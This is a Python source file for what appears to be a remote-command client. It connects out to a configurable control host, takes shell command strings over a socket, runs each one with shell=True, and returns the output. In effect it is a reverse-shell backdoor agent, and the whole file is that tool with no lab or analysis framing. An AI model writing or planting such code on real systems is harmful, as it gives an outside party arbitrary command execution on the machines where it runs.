import logging
import socket
import sys
import subprocess
from sockettools import getFromSocket
HOST = "127.0.0.1"
PORT = 7777
logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] (%(threadName)-10s) %(message)s',)


if __name__ == "__main__":
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = sys.argv[2]
    controlSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    controlSocket.connect((HOST, PORT,))
    logging.debug('Initiated control connection')
    while True:
        try:
            dataPort = getFromSocket(controlSocket, 5)
            dataPort = int(dataPort)
        except ValueError:
            logging.debug('Got gibberish dataPort %s', dataPort)
            continue  # Wait for a new port
        except ConnectionResetError:
            logging.debug('Main connection gone with the wind, quit')
            break  # Quit
        dataSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            dataSocket.connect((HOST, dataPort,))
            logging.debug('Initiated data connection')
        except ConnectionRefusedError:
            logging.debug('Cannot connect to dataSocket')
            continue  # Wait for another port
        while True:
            try:
                cmdLength = getFromSocket(dataSocket, 8)
                cmdLength = int(cmdLength)
            except ValueError:
                logging.debug('Got gibberish cmdLength %s', cmdLength)
                continue  # Wait for another command, hopefully
            except ConnectionResetError:
                logging.debug('Data connection gone with the wind')
                break  # Wait for another port
            cmd = str(getFromSocket(dataSocket, cmdLength))[2:-1]
            logging.debug('Received command %s', cmd)
            cmdRun = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # TODO: send stdout and stderr back?
            # print(cmdRun.stdout.decode('utf_8'))
            # print(cmdRun.stderr.decode('utf_8'))
            dataSocket.sendall(str(len(cmdRun.stdout)).encode('utf_8').zfill(8))
            dataSocket.sendall(cmdRun.stdout)
        dataSocket.close()
    controlSocket.close()
